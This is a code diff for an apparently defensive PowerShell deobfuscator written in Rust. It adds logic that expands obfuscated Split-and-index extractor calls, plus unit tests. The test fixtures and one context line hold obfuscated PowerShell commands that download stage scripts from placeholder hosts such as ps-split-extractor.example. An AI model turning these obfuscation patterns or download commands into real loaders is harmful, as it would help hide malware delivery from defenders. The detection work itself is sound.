@@ -968,6 +968,14 @@ static PS_LITERAL_DOT_REPLACE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Split\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
+    )
+    .expect("ps literal split index extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
@@ -3289,6 +3297,43 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
     out
 }
 
+fn expand_literal_split_index_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("function ") || !lower.contains(".split") || !text.contains('\'') {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(sep_var) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(index_var) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(sep_idx) = param_index.get(&sep_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+        let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        out = inline_ps_literal_split_index_calls(&out, &name, value_idx, sep_idx, index_idx);
+    }
+    out
+}
+
 fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)> {
     let bytes = text.as_bytes();
     let mut defs = Vec::new();
@@ -3557,6 +3602,133 @@ fn inline_ps_literal_replace_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+fn inline_ps_literal_split_index_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    sep_idx: usize,
+    index_idx: usize,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needle_name = name.to_ascii_lowercase();
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut search_from = 0;
+    let mut match_count = 0;
+
+    while match_count < 128 {
+        let Some(rel) = lower[search_from..].find(&needle_name) else {
+            break;
+        };
+        let call_start = search_from + rel;
+        let end_name = call_start + name.len();
+        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
+            || is_ident_byte(bytes.get(end_name).copied())
+        {
+            search_from = end_name;
+            continue;
+        }
+
+        let mut pos = skip_ascii_ws(bytes, end_name);
+        let parenthesized = bytes.get(pos) == Some(&b'(');
+        if parenthesized {
+            pos = skip_ascii_ws(bytes, pos + 1);
+        }
+        let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
+            search_from = end_name;
+            continue;
+        };
+        pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
+        let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
+            search_from = first_end;
+            continue;
+        };
+        pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
+        let Some((third_end, third)) = parse_ps_literal_or_usize_arg(text, pos) else {
+            search_from = second_end;
+            continue;
+        };
+        let mut call_end = third_end;
+        if parenthesized {
+            let after = skip_ascii_ws(bytes, call_end);
+            if bytes.get(after) != Some(&b')') {
+                search_from = third_end;
+                continue;
+            }
+            call_end = after + 1;
+        }
+
+        let args = [first, second, third];
+        let Some(value) = args.get(value_idx).and_then(PsLiteralOrUsizeArg::as_str) else {
+            search_from = call_end;
+            continue;
+        };
+        let Some(sep) = args.get(sep_idx).and_then(PsLiteralOrUsizeArg::as_str) else {
+            search_from = call_end;
+            continue;
+        };
+        let Some(index) = args.get(index_idx).and_then(PsLiteralOrUsizeArg::as_usize) else {
+            search_from = call_end;
+            continue;
+        };
+        if value.len() > 8192 {
+            search_from = call_end;
+            continue;
+        }
+        if sep.is_empty() {
+            search_from = call_end;
+            continue;
+        }
+        let Some(part) = value.split(sep).nth(index) else {
+            search_from = call_end;
+            continue;
+        };
+        if part.len() > 8192 {
+            search_from = call_end;
+            continue;
+        }
+        let replacement = format!("'{}'", part.replace('\'', "''"));
+        matches.push((call_start, call_end, replacement));
+        search_from = call_end;
+        match_count += 1;
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+enum PsLiteralOrUsizeArg {
+    Str(String),
+    Usize(usize),
+}
+
+impl PsLiteralOrUsizeArg {
+    fn as_str(&self) -> Option<&str> {
+        match self {
+            Self::Str(value) => Some(value.as_str()),
+            Self::Usize(_) => None,
+        }
+    }
+
+    fn as_usize(&self) -> Option<usize> {
+        match self {
+            Self::Str(_) => None,
+            Self::Usize(value) => Some(*value),
+        }
+    }
+}
+
+fn parse_ps_literal_or_usize_arg(text: &str, pos: usize) -> Option<(usize, PsLiteralOrUsizeArg)> {
+    if let Some((end, value)) = parse_ps_static_quoted_literal(text, pos) {
+        return Some((end, PsLiteralOrUsizeArg::Str(value)));
+    }
+    let (end, value) = parse_ps_usize_arg(text, pos)?;
+    Some((end, PsLiteralOrUsizeArg::Usize(value)))
 }
 
 fn skip_ps_arg_separator(bytes: &[u8], pos: usize, parenthesized: bool) -> usize {
@@ -3941,6 +4113,9 @@ fn expand_obfuscation(text: &str) -> String {
                 out = expand_ps_dot_substring(&out);
                 out = expand_literal_substring_extractor_calls(&out);
             }
+            if signals.split_index {
+                out = expand_literal_split_index_extractor_calls(&out);
+            }
         });
         profile_expand_step!("embedded_single_quote", iter, {
             if signals.embedded_single_quote_assignment {
@@ -4044,6 +4219,9 @@ fn expand_obfuscation(text: &str) -> String {
                 out = expand_ps_dot_substring(&out);
                 out = expand_literal_substring_extractor_calls(&out);
             }
+            if signals.split_index {
+                out = expand_literal_split_index_extractor_calls(&out);
+            }
         });
         let mut variables_changed = false;
         profile_expand_step!("variables", iter, {
@@ -4092,6 +4270,7 @@ struct PsObfuscationSignals {
     invoke_wrapper: bool,
     dot_replace: bool,
     substring: bool,
+    split_index: bool,
     embedded_single_quote_assignment: bool,
     doubled_single_quote: bool,
     skip_nth: bool,
@@ -4125,6 +4304,7 @@ impl PsObfuscationSignals {
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
         let substring = lower.contains(".substring");
+        let split_index = has_function_def && lower.contains(".split") && text.contains('[');
         let embedded_single_quote_assignment = has_embedded_single_quote_assignment_signal(text);
         let doubled_single_quote = text.contains("''");
         let skip_nth = has_function_def
@@ -4167,6 +4347,7 @@ impl PsObfuscationSignals {
             invoke_wrapper,
             dot_replace,
             substring,
+            split_index,
             embedded_single_quote_assignment,
             doubled_single_quote,
             skip_nth,
@@ -4197,6 +4378,7 @@ impl PsObfuscationSignals {
             || self.invoke_wrapper
             || self.dot_replace
             || self.substring
+            || self.split_index
             || self.embedded_single_quote_assignment
             || self.doubled_single_quote
             || self.skip_nth
@@ -6067,8 +6249,8 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
 mod literal_substring_extractor_tests {
     use super::{
         expand_doubled_quote_literals, expand_literal_replace_extractor_calls,
-        expand_literal_substring_extractor_calls, literal_substring_extractor_defs,
-        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+        expand_literal_split_index_extractor_calls, expand_literal_substring_extractor_calls,
+        literal_substring_extractor_defs, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
 
     #[test]
@@ -6123,6 +6305,36 @@ Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-replace-extractor.example/stage.ps1'"),
             "replace extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_split_index_extractor_call_is_rewritten() {
+        let text = r#"function Piece($value,$sep,$index) {
+  return $value.Split($sep)[$index]
+}
+Piece 'noise|Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1|tail' '|' 1"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1'"),
+            "split-index extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_split_index_extractor_reordered_call_is_rewritten() {
+        let text = r#"function Piece($index,$sep,$value) {
+  return $value.Split($sep)[$index]
+}
+Piece 1 '|' 'noise|Invoke-WebRequest -Uri https://ps-split-reordered.example/stage.ps1|tail'"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-split-reordered.example/stage.ps1'"),
+            "reordered split-index extractor call was not rewritten:\n{out}"
         );
     }
 }
